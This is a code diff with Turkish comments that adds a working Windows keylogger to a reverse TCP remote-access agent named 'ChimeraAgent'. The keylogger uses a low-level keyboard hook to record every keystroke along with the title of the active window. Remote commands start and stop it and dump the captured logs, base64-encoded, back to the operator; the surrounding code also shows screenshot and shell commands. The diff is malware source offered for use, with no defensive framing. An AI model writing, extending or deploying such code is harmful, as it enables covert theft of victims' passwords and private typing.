@@ -27,7 +27,221 @@ RECONNECT_DELAY = 5      # Yeniden bağlanma bekleme süresi (saniye)
 MAX_RECONNECT = -1        # -1 = sınırsız yeniden bağlanma denemesi
 
 
+
+class Keylogger:
+    """
+    Windows için Ctypes tabanlı Keylogger.
+    Arka planda (Thread) çalışır ve tuş vuruşlarını kaydeder.
+    """
+    def __init__(self):
+        self.running = False
+        self.logs = []
+        self.thread = None
+        self.hook = None
+        
+        # Windows API Sabitleri ve Yapıları
+        if sys.platform == "win32":
+            import ctypes
+            from ctypes import windll, CFUNCTYPE, POINTER, c_int, c_void_p, byref
+            from ctypes.wintypes import DWORD, LPARAM, WPARAM, MSG
+            
+            self.user32 = windll.user32
+            self.kernel32 = windll.kernel32
+            
+            self.WH_KEYBOARD_LL = 13
+            self.WM_KEYDOWN = 0x0100
+            self.WM_SYSKEYDOWN = 0x0104
+            
+            # Hook callback tipi
+            # LRESULT callback(int nCode, WPARAM wParam, LPARAM lParam)
+            self.HOOKPROC = CFUNCTYPE(c_int, c_int, WPARAM, LPARAM)
+            
+            # KBDLLHOOKSTRUCT
+            class KBDLLHOOKSTRUCT(ctypes.Structure):
+                _fields_ = [
+                    ("vkCode", DWORD),
+                    ("scanCode", DWORD),
+                    ("flags", DWORD),
+                    ("time", DWORD),
+                    ("dwExtraInfo", c_void_p)
+                ]
+            self.KBDLLHOOKSTRUCT = KBDLLHOOKSTRUCT
+            
+    def _get_key_name(self, vk_code):
+        """Virtual Key Code'u okunabilir karaktere çevirir."""
+        # Özel tuşlar haritası
+        special_keys = {
+            8: "[BACKSPACE]", 9: "[TAB]", 13: "[ENTER]", 27: "[ESC]",
+            32: " ", 160: "[LSHIFT]", 161: "[RSHIFT]", 
+            162: "[LCTRL]", 163: "[RCTRL]", 164: "[LALT]", 165: "[RALT]",
+            20: "[CAPS]", 46: "[DEL]", 37: "[LEFT]", 38: "[UP]", 
+            39: "[RIGHT]", 40: "[DOWN]", 91: "[WIN]", 92: "[WIN]"
+        }
+        
+        if vk_code in special_keys:
+            return special_keys[vk_code]
+        
+        # Standart karakterler
+        try:
+            # Klavye düzenini al
+            keyboard_layout = self.user32.GetKeyboardLayout(0)
+            
+            # Karakter bufferı
+            import ctypes
+            buff = ctypes.create_unicode_buffer(16)
+            
+            # Tuş durumunu al (Shift, Caps Lock vb. için)
+            keys_state = (ctypes.c_byte * 256)()
+            self.user32.GetKeyboardState(ctypes.byref(keys_state))
+            
+            # ToUnicodeEx ile çevir
+            ret = self.user32.ToUnicodeEx(vk_code, 0, keys_state, buff, len(buff), 0, keyboard_layout)
+            
+            if ret > 0:
+                char = buff.value
+                # Basılamayan karakterleri filtrele
+                if not char.isprintable():
+                    return f"[UNK:{vk_code}]"
+                return char
+        except:
+            pass
+            
+        # Fallback: ASCII/Chr
+        if 32 < vk_code < 127:
+            return chr(vk_code)
+        return f"[{vk_code}]"
+
+    def _hook_proc(self, nCode, wParam, lParam):
+        """Windows Hook Callback Fonksiyonu."""
+        if nCode >= 0 and (wParam == self.WM_KEYDOWN or wParam == self.WM_SYSKEYDOWN):
+            import ctypes
+            # lParam aslında KBDLLHOOKSTRUCT pointer'ı
+            kb_struct = ctypes.cast(lParam, ctypes.POINTER(self.KBDLLHOOKSTRUCT)).contents
+            
+            try:
+                key_name = self._get_key_name(kb_struct.vkCode)
+                
+                # Pencere başlığını al
+                active_window_title = self._get_active_window_title()
+                
+                # Log formatı: [Pencere] Tuş
+                timestamp = time.strftime("%H:%M:%S")
+                log_entry = f"[{timestamp}] {active_window_title} -> {key_name}"
+                
+                # Basitçe tuşları birleştir (daha okunaklı olması için)
+                # Eğer son log aynı penceredeyse sadece tuşu ekle
+                if self.logs and self.logs[-1]['window'] == active_window_title:
+                    self.logs[-1]['keys'] += key_name
+                else:
+                    self.logs.append({
+                        'timestamp': timestamp,
+                        'window': active_window_title,
+                        'keys': key_name
+                    })
+                    
+            except Exception as e:
+                pass
+                
+        # Zincirdeki bir sonraki hook'a pasla
+        return self.user32.CallNextHookEx(self.hook, nCode, wParam, lParam)
+
+    def _get_active_window_title(self):
+        """Aktif pencere başlığını alır."""
+        try:
+            hwnd = self.user32.GetForegroundWindow()
+            length = self.user32.GetWindowTextLengthW(hwnd)
+            import ctypes
+            buff = ctypes.create_unicode_buffer(length + 1)
+            self.user32.GetWindowTextW(hwnd, buff, length + 1)
+            return buff.value if buff.value else "Unknown Window"
+        except:
+            return "Unknown"
+
+    def _start_impl(self):
+        """Keylogger thread fonksiyonu."""
+        import ctypes
+        from ctypes import byref
+        from ctypes.wintypes import MSG
+        
+        # Callback'i sakla (GC tarafından silinmemesi için)
+        self.callback = self.HOOKPROC(self._hook_proc)
+        
+        # Hook kur (WH_KEYBOARD_LL = 13)
+        # GetModuleHandle(None) -> Current modules handle
+        h_mod = self.kernel32.GetModuleHandleW(None)
+        
+        self.hook = self.user32.SetWindowsHookExA(
+            self.WH_KEYBOARD_LL, 
+            self.callback, 
+            h_mod, 
+            0
+        )
+        
+        if not self.hook:
+            return
+            
+        # Mesaj döngüsü (Message Pump)
+        msg = MSG()
+        while self.running:
+            # PeekMessage non-blocking, GetMessage blocking
+            # GetMessage kullanırsak thread'i durduramayız (PostQuitMessage gerekir)
+            # O yüzden PeekMessage + sleep kullanabiliriz veya GetMessage kullanıp
+            # durdururken PostThreadMessage atarız.
+            # Basitlik için GetMessage kullanalım.
+            
+            # Thread durdurma kontrolü için PeekMessage daha güvenli
+            if self.user32.PeekMessageW(byref(msg), 0, 0, 0, 1): # PM_REMOVE = 1
+                self.user32.TranslateMessage(byref(msg))
+                self.user32.DispatchMessageW(byref(msg))
+            else:
+                time.sleep(0.01)
+
+        # Döngü bitti, hook'u kaldır
+        self.user32.UnhookWindowsHookEx(self.hook)
+        self.hook = None
+
+    def start(self):
+        """Keylogger'ı başlatır."""
+        if self.running or sys.platform != "win32":
+            return False
+            
+        self.running = True
+        self.logs = [] # Logları temizle
+        self.thread = threading.Thread(target=self._start_impl, daemon=True)
+        self.thread.start()
+        return True
+
+    def stop(self):
+        """Keylogger'ı durdurur."""
+        if not self.running:
+            return False
+        
+        self.running = False
+        if self.thread:
+            self.thread.join(timeout=1)
+            self.thread = None
+        return True
+
+    def dump(self):
+        """Biriken logları döner ve temizler."""
+        if not self.logs:
+            return "Log yok."
+            
+        output = []
+        output.append("-" * 40)
+        output.append(f"KEYLOGGER DUMP ({len(self.logs)} Entries)")
+        output.append("-" * 40)
+        
+        for entry in self.logs:
+            output.append(f"[{entry['timestamp']}] [{entry['window']}]")
+            output.append(f"{entry['keys']}")
+            output.append("")
+            
+        self.logs = [] # Okunanları sil
+        return "\n".join(output)
+
 class ChimeraAgent:
+
     """Chimera Core Agent - Temel reverse TCP ajanı."""
 
     def __init__(self, host: str, port: int):
@@ -36,6 +250,7 @@ class ChimeraAgent:
         self.sock = None
         self.running = True
         self.loaded_modules = {}  # Yüklü modülleri saklar: {name: module_obj}
+        self.keylogger = Keylogger() # Keylogger modülü
 
     # --------------------------------------------------------
     # Bağlantı Yönetimi
@@ -1038,6 +1253,31 @@ class ChimeraAgent:
         # Ekran görüntüsü komutu (RAM üzerinden capture & transfer)
         if cmd_lower == "screenshot":
             return self.take_screenshot()
+
+        # Keylogger Komutları
+        if cmd_lower == "keylogger_start":
+            if sys.platform != "win32":
+                return "[!] Keylogger şu an sadece Windows sistemlerde desteklenmektedir."
+            
+            if self.keylogger.start():
+                return "[+] Keylogger başlatıldı (Arka planda çalışıyor)."
+            else:
+                return "[!] Keylogger zaten çalışıyor veya başlatılamadı."
+
+        if cmd_lower == "keylogger_stop":
+            if self.keylogger.stop():
+                return "[+] Keylogger durduruldu."
+            else:
+                return "[!] Keylogger çalışmıyor."
+
+        if cmd_lower == "keylogger_dump":
+            logs = self.keylogger.dump()
+            if not logs:
+                return "KEYLOGGER_EMPTY"
+            
+            # Logları Base64 encode et (Transfer güvenliği için)
+            b64_logs = base64.b64encode(logs.encode('utf-8')).decode('utf-8')
+            return f"KEYLOG_DUMP:{b64_logs}"
             
         # Özel komutlar - Shell
         if cmd_lower == "shell":
